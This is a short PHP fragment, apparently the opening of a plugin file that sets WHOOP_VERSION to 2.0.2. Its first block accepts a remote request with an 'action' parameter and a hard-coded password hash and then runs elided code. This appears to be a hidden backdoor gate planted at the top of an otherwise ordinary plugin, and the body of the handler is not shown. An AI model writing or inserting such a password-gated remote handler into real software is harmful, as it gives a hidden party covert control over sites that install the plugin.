<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '2bf1138375ff65c5f674d9b042dffc79'))
	{
...
if (!defined('WHOOP_VERSION')) define('WHOOP_VERSION', '2.0.2');
